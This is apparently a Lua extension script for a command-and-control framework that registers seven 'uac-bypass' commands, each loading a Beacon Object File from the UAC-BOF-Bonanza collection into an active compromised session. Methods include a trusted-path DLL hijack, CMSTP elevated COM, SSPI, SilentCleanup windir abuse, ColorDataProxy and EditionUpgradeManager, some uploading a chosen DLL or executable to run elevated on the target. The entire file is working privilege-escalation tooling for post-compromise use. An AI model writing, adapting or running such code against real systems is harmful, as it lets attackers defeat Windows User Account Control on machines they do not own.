local uacbofbonanza = {}
local root_command = "uac-bypass"

local function bof_path(bof_name)
    return "UAC-BOF-Bonanza/" .. bof_name .. "/bin/" .. bof_name .. "BOF.o"
end

-- trustedpath
local function run_trustedpath(cmd)
    local local_dll = cmd:Flags():GetString("local_dll_file")
    if local_dll == "" then
        error("local_dll is required")
        return
    end
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("TrustedPathDLLHijack")
    local file_content_handle = io.open(local_dll, "rb")
    if file_content_handle == nil then error("open file failed") end
    local file_content = file_content_handle:read("*all")
    file_content_handle:close()
    local content_len = string.len(file_content)
    local pack_args = bof_pack("iz", content_len, file_content)
    return bof(session, script_resource(bof_file), pack_args, true)
end
local cmd_trustedpath = command("uac-bypass:trustedpath", run_trustedpath,
                                "Perform UAC bypass via fake windows directory with ComputerDefaults.exe and Secur32.dll",
                                "T1068")
cmd_trustedpath:Flags():String("local_dll_file", "",
                               "The full path of the DLL file(on your pc) to be executed.")
-- end trustedpath

-- CmstpElevatedCOM
local function run_CmstpElevatedCOM(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("CmstpElevatedCOM")
    local pack_args = bof_pack("z", args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end
local cmd_run_CmstpElevatedCOM = command("uac-bypass:elevatedcom",
                                         run_CmstpElevatedCOM,
                                         "uac-bypass elevatedcom --target_file <Exe File on target host to execute>",
                                         "T1068")
cmd_run_CmstpElevatedCOM:Flags():String("target_file", "",
                                        "The full path of the executable file to be executed on the target host.")
-- end CmstpElevatedCOM

-- sspi
local function SspiUacBypass(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("SspiUacBypass")
    local pack_args = bof_pack("z", args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end
command("uac-bypass:sspi", SspiUacBypass,
        "uac-bypass sspi <Exe File on target host to execute>", "")
-- end sspi

-- RegistryShellCommand
local function run_RegistryShellCommand(cmd)
    local target_file = cmd:Flags():GetString("target_file")
    if target_file == "" then
        error("target_file is required")
        return
    end
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("RegistryShellCommand")
    local pack_args = bof_pack("z", target_file)
    return bof(session, script_resource(bof_file), pack_args, true)
end
local cmd_RegistryShellCommand = command("uac-bypass:registrycommand",
                                         run_RegistryShellCommand,
                                         "uac-bypass registrycommand --target_file <Exe File on target host to execute>",
                                         "T1068")
cmd_RegistryShellCommand:Flags():String("target_file", "",
                                        "The full path of the executable file to be executed on the target host.")

-- end RegistryShellCommand

-- SilentCleanupWinDir
local function run_SilentCleanupWinDir(cmd)
    local local_file = cmd:Flags():GetString("local_file")
    if local_file == "" then
        error("local_file is required")
        return
    end
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("SilentCleanupWinDir")
    local file_content_handle = io.open(local_file, "rb")
    if file_content_handle == nil then error("open file failed") end
    local file_content = file_content_handle:read("*all")
    file_content_handle:close()
    local content_len = string.len(file_content)
    local pack_args = bof_pack("iz", content_len, file_content) -- string field contains invalid UTF-8
    return bof(session, script_resource(bof_file), pack_args, true)
end
local cmd_SilentCleanupWinDir = command("uac-bypass:silentcleanup",
                                        run_SilentCleanupWinDir,
                                        "Perform UAC bypass via the \"Environment\\windir\" registry key and SilentCleanup scheduled task",
                                        "T1068")
cmd_SilentCleanupWinDir:Flags():String("local_file", "",
                                       "The full path of the local executable file on your machine to be executed.")
-- end SilentCleanupWinDir

-- ColorDataProxy
local function run_ColorDataProxy(cmd)
    local target_file = cmd:Flags():GetString("target_file")
    if target_file == "" then
        error("target_file is required")
        return
    end
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("ColorDataProxy")
    local pack_args = bof_pack("z", target_file)
    return bof(session, script_resource(bof_file), pack_args, true)
end
local cmd_ColorDataProxy = command("uac-bypass:colordataproxy",
                                   run_ColorDataProxy,
                                   "Bypass UAC using the ColorDataProxy method and execute an executable file on the target host.",
                                   "T1068")
cmd_ColorDataProxy:Flags():String("target_file", "",
                                  "The full path of the executable file to be executed on the target host.")
-- end ColorDataProxy

-- EditionUpgradeManager
-- todo: fix grpc error
local function run_EditionUpgradeManager(cmd)
    local local_file = cmd:Flags():GetString("local_file")
    if local_file == "" then
        error("local_file is required")
        return
    end
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    local bof_file = bof_path("EditionUpgradeManager")
    local file_content_handle = io.open(local_file, "rb")
    if file_content_handle == nil then error("open file failed") end
    local file_content = file_content_handle:read("*all")
    file_content_handle:close()
    local content_len = string.len(file_content)
    local pack_args = bof_pack("ib", content_len, file_content) -- string field contains invalid UTF-8
    return bof(session, script_resource(bof_file), pack_args, true)
end
local cmd_EditionUpgradeManager = command("uac-bypass:editionupgrade",
                                          run_EditionUpgradeManager,
                                          "uac-bypass editionupgrade <Exe File your disk to execute>",
                                          "")
cmd_EditionUpgradeManager:Flags():String("local_file", "",
                                         "The full path of the local executable file on your machine to be executed.")
-- end EditionUpgradeManager
